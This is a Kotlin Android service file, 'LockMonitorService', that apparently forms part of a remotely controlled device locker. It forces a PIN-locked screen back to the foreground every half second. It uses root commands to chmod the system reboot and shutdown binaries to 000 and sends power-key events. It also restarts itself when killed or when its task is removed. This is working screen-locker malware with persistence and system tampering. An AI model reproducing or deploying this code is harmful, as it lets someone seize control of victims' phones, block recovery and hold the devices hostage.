package com.sync.xxx

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat

class LockMonitorService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private var isMonitoring = false
    private var correctPin = "1234"
    private var lockTitle = "LOCKED"
    private var periodicCheckRunnable: Runnable? = null
    private lateinit var prefs: android.content.SharedPreferences
    private var isManualUnlock = false  // ← FLAG UNLOCK MANUAL

    companion object {
        private const val CHANNEL_ID = "lock_monitor_channel"
        private const val NOTIFICATION_ID = 9999
        const val EXTRA_PIN = "pin"
        const val EXTRA_TITLE = "title"
        const val ACTION_STOP_MONITORING = "com.sync.xxx.STOP_LOCK_MONITOR"
        const val ACTION_UNLOCK_SYSTEM = "com.sync.xxx.UNLOCK_SYSTEM"
        
        private const val PREFS_NAME = "lock_chat_v3_prefs"
        private const val KEY_LOCK_ACTIVE = "lock_active"
        private const val KEY_LOCK_PIN = "lock_pin"
        private const val KEY_LOCK_TITLE = "lock_title"
        private const val KEY_MANUAL_UNLOCK = "manual_unlock"  // ← FLAG UNLOCK
    }

    override fun onCreate() {
        super.onCreate()
        prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP_MONITORING -> {
                isManualUnlock = true
                prefs.edit().putBoolean(KEY_MANUAL_UNLOCK, true).apply()
                stopLock()
                return START_NOT_STICKY
            }
            
            ACTION_UNLOCK_SYSTEM -> {
                isManualUnlock = true
                prefs.edit().putBoolean(KEY_MANUAL_UNLOCK, true).apply()
                restoreSystemPermissions()
                stopLock()
                sendBroadcast(Intent("com.sync.xxx.LOCKCHAT_UNLOCK_PERMANENT"))
                return START_NOT_STICKY
            }
            
            else -> {
                // CLEAR FLAG UNLOCK saat lock ulang dari dashboard
                prefs.edit().putBoolean(KEY_MANUAL_UNLOCK, false).apply()
                isManualUnlock = false
                
                correctPin = intent?.getStringExtra(EXTRA_PIN) ?: prefs.getString(KEY_LOCK_PIN, "1234") ?: "1234"
                lockTitle = intent?.getStringExtra(EXTRA_TITLE) ?: prefs.getString(KEY_LOCK_TITLE, "LOCKED") ?: "LOCKED"
                
                prefs.edit().apply {
                    putBoolean(KEY_LOCK_ACTIVE, true)
                    putString(KEY_LOCK_PIN, correctPin)
                    putString(KEY_LOCK_TITLE, lockTitle)
                    apply()
                }
                
                startForeground(NOTIFICATION_ID, createNotification())
                startMonitoring()
                disableSystemRebootShutdown()
            }
        }
        
        return START_STICKY
    }

    private fun startMonitoring() {
        isMonitoring = true
        monitorLockChat()
        startPeriodicCheck()
    }

    private fun stopMonitoring() {
        isMonitoring = false
        handler.removeCallbacksAndMessages(null)
        periodicCheckRunnable = null
    }

    private fun monitorLockChat() {
        if (!isMonitoring) return
        
        // CEK FLAG MANUAL UNLOCK - STOP MONITORING
        if (prefs.getBoolean(KEY_MANUAL_UNLOCK, false)) {
            android.util.Log.d("LockMonitor", "Manual unlock detected, stopping monitor loop")
            stopMonitoring()
            return
        }

        handler.postDelayed({
            if (!isLockChatForeground()) {
                val intent = Intent(this, LockChatActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or 
                           Intent.FLAG_ACTIVITY_CLEAR_TOP or
                           Intent.FLAG_ACTIVITY_SINGLE_TOP
                    putExtra(LockChatActivity.EXTRA_TITLE, lockTitle)
                    putExtra(LockChatActivity.EXTRA_PIN, correctPin)
                }
                startActivity(intent)
            }
            
            monitorLockChat()
        }, 500)
    }

    private fun startPeriodicCheck() {
        periodicCheckRunnable = object : Runnable {
            override fun run() {
                if (!isMonitoring) return
                disableSystemRebootShutdown()
                handler.postDelayed(this, 10000)
            }
        }
        handler.postDelayed(periodicCheckRunnable!!, 10000)
    }

    private fun disableSystemRebootShutdown() {
        try {
            val commands = arrayOf(
                "chmod 000 /system/bin/reboot",
                "chmod 000 /system/bin/shutdown",
                "chmod 000 /system/xbin/reboot",
                "chmod 000 /system/xbin/shutdown",
                "input keyevent 26"  // ← BLOCK POWER BUTTON
            )
            
            commands.forEach { cmd ->
                try {
                    Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
                } catch (_: Exception) {}
            }
            
            android.util.Log.d("LockMonitor", "System reboot/shutdown disabled")
        } catch (e: Exception) {
            android.util.Log.w("LockMonitor", "Failed to disable reboot/shutdown: ${e.message}")
        }
    }

    private fun restoreSystemPermissions() {
        try {
            val commands = arrayOf(
                "chmod 755 /system/bin/reboot",
                "chmod 755 /system/bin/shutdown",
                "chmod 755 /system/xbin/reboot",
                "chmod 755 /system/xbin/shutdown"
            )
            
            commands.forEach { cmd ->
                try {
                    Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
                } catch (_: Exception) {}
            }
            
            android.util.Log.d("LockMonitor", "System reboot/shutdown restored")
        } catch (e: Exception) {
            android.util.Log.w("LockMonitor", "Failed to restore reboot/shutdown: ${e.message}")
        }
    }

    private fun isLockChatForeground(): Boolean {
        val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val appProcesses = activityManager.runningAppProcesses
                appProcesses?.any { 
                    it.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND &&
                    it.processName == packageName
                } ?: false
            } else {
                @Suppress("DEPRECATION")
                val tasks = activityManager.getRunningTasks(1)
                tasks?.firstOrNull()?.topActivity?.packageName == packageName
            }
        } catch (e: Exception) {
            false
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Lock Monitor V3",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Lock Chat V3 - Hard Lock Active"
                setShowBadge(false)
            }
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Device Locked V3")
            .setContentText("Lock monitor active - Hard persistence enabled")
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }

    private fun stopLock() {
        isMonitoring = false
        isManualUnlock = true
        prefs.edit().putBoolean(KEY_MANUAL_UNLOCK, true).apply()
        handler.removeCallbacksAndMessages(null)
        stopForeground(true)
        stopSelf()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        
        // CEK APAKAH MANUAL UNLOCK
        if (prefs.getBoolean(KEY_MANUAL_UNLOCK, false)) {
            android.util.Log.d("LockMonitor", "Manual unlock, not restarting")
            return
        }

        if (isMonitoring) {
            android.util.Log.w("LockMonitor", "Service destroyed while monitoring - restarting")
            val restartIntent = Intent(this, LockMonitorService::class.java).apply {
                putExtra(EXTRA_PIN, correctPin)
                putExtra(EXTRA_TITLE, lockTitle)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restartIntent)
            } else {
                startService(restartIntent)
            }
        }
        stopMonitoring()
    }
    
    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        
        // CEK APAKAH MANUAL UNLOCK
        if (prefs.getBoolean(KEY_MANUAL_UNLOCK, false)) {
            android.util.Log.d("LockMonitor", "Manual unlock, not restarting")
            return
        }

        if (isMonitoring) {
            android.util.Log.w("LockMonitor", "Task removed - restarting service")
            val restartIntent = Intent(this, LockMonitorService::class.java).apply {
                putExtra(EXTRA_PIN, correctPin)
                putExtra(EXTRA_TITLE, lockTitle)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restartIntent)
            } else {
                startService(restartIntent)
            }
        }
    }
}
